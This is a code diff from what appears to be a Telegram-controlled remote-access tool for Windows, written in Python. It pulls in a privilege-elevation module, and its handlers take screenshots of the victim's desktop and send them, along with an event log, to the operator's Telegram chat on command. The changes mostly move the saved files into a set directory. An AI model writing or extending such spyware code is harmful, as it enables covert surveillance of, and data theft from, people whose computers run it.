@@ -10,6 +10,8 @@ import sys
 
 
 
+#import all required modules here
+#so that no errors are thrown because of unavailable modules
 
 
 
@@ -50,8 +52,6 @@ from subprocess import call
 from telegram import ForceReply, Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 from elevate import elevate
-from win32com.shell import shell
-import multiprocessing
 from multiprocessing import Process
 import time
 from os.path import expanduser
@@ -380,8 +380,8 @@ else:
             
         try:
             img_grab=pyautogui.screenshot()
-            img_grab.save("image1.png")
-            await update.message._bot.sendDocument(update.message.chat_id,open("image1.png","rb"))
+            img_grab.save(dir_pathV+"image1.png")
+            await update.message._bot.sendDocument(update.message.chat_id,open(dir_pathV+"image1.png","rb"))
             print("sent")
             logins.info("FUNC IMAGE_GRAB","IMAGE_GRAB INITIATED")
         except:
@@ -394,9 +394,9 @@ else:
     #Function definition log file access method. Call /getlogfile to get a text log file of all events logged by the program.
     async def get_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         try:
-            if not open("logfile.txt","r"):
+            if not open(dir_pathV+"logfile.txt","r"):
                 logins.warning("LOGFILE ACCESS","COULD NOT OPEN FILE")
-            await update.message._bot.sendDocument(update.message.chat_id,open("logfile.txt","rb"))
+            await update.message._bot.sendDocument(update.message.chat_id,open(dir_pathV+"logfile.txt","rb"))
             print("sent")
             logins.info("LOGFILE ACCESS","FILE SENT ")
         except:
@@ -497,6 +497,18 @@ else:
         
         except:
             logins.critical("MAIN","ERROR OCCURED WHILE INITIATING MAIN")
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
